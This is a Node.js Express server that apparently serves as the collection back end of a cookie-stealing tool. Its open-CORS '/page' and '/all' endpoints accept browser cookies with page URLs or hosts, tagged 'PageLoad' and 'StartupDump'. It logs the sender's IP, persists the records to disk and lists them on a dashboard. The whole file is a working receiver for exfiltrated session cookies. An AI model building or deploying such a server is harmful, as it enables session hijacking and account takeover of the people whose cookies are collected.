const express = require('express');
const morgan = require('morgan');
const cors = require('cors');
const dayjs = require('dayjs');
const utc = require('dayjs/plugin/utc');
const timezone = require('dayjs/plugin/timezone');
dayjs.extend(utc);
dayjs.extend(timezone);
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Persistence paths
const DATA_DIR = path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'store.json');

// In-memory store (simple demo) – restart clears data
const store = {
  page: [], // items: { id, ts, url, cookies, tag, ip }
  all: []   // items: { id, ts, host, cookies, tag, ip }
};
let nextId = 1;

function ensureDataDir() {
  try { fs.mkdirSync(DATA_DIR, { recursive: true }); } catch {}
}

function persistStore() {
  try {
    ensureDataDir();
    const data = { page: store.page, all: store.all, savedAt: Date.now() };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (e) {
    console.error('Failed to save store:', e);
  }
}

function loadStoreFromDisk() {
  try {
    ensureDataDir();
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
      const data = JSON.parse(raw || '{}');
      store.page = Array.isArray(data.page) ? data.page : [];
      store.all = Array.isArray(data.all) ? data.all : [];
      // Assign IDs to items missing them and compute nextId
      let maxId = 0;
      for (const arr of [store.page, store.all]) {
        for (const it of arr) {
          if (typeof it.id !== 'number') {
            it.id = ++maxId;
          } else {
            if (it.id > maxId) maxId = it.id;
          }
        }
      }
      nextId = maxId + 1;
    } else {
      persistStore();
    }
  } catch (e) {
    console.error('Failed to load store:', e);
  }
}

app.set('view engine', 'ejs');
app.set('views', __dirname + '/views');

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(morgan('dev'));
app.use('/static', express.static(__dirname + '/public'));

// Load persisted data on startup
loadStoreFromDisk();

// Health check
app.get('/health', (req, res) => res.send('ok'));

// Dashboard
app.get('/', (req, res) => {
  res.render('index', {
    page: store.page.slice().reverse(),
    all: store.all.slice().reverse(),
    dayjs
  });
});

// Helper to get client IP
function getClientIp(req) {
  // Prefer X-Forwarded-For if behind a proxy, else fall back
  const xff = req.headers['x-forwarded-for'];
  let ip = '';
  if (typeof xff === 'string' && xff.length > 0) {
    ip = xff.split(',')[0].trim();
  } else {
    ip = req.ip || (req.socket && req.socket.remoteAddress) || '';
  }
  // Normalize IPv6 formats like ::1 or ::ffff:127.0.0.1
  if (ip === '::1') ip = '127.0.0.1';
  if (ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
  return ip;
}

// Receive PageLoad payloads
app.post('/page', (req, res) => {
  const { tag = 'PageLoad', url = '', cookies = '', ts = Date.now() } = req.body || {};
  const ip = getClientIp(req);
  const item = { id: nextId++, tag, url, cookies, ts, ip };
  store.page.push(item);
  persistStore();
  res.json({ ok: true });
});

// Receive StartupDump/All payloads
app.post('/all', (req, res) => {
  const { tag = 'StartupDump', host = '', cookies = '', ts = Date.now() } = req.body || {};
  const ip = getClientIp(req);
  const item = { id: nextId++, tag, host, cookies, ts, ip };
  store.all.push(item);
  persistStore();
  res.json({ ok: true });
});

// Delete a single Page item
app.delete('/page/:id', (req, res) => {
  const id = Number(req.params.id);
  const before = store.page.length;
  store.page = store.page.filter(it => it.id !== id);
  const deleted = before - store.page.length;
  if (deleted > 0) persistStore();
  res.json({ ok: true, deleted });
});

// Delete a single All item
app.delete('/all/:id', (req, res) => {
  const id = Number(req.params.id);
  const before = store.all.length;
  store.all = store.all.filter(it => it.id !== id);
  const deleted = before - store.all.length;
  if (deleted > 0) persistStore();
  res.json({ ok: true, deleted });
});

// Clear data (optional)
app.post('/_clear', (req, res) => {
  store.page = [];
  store.all = [];
  persistStore();
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`Listening on http://localhost:${PORT}`);
});
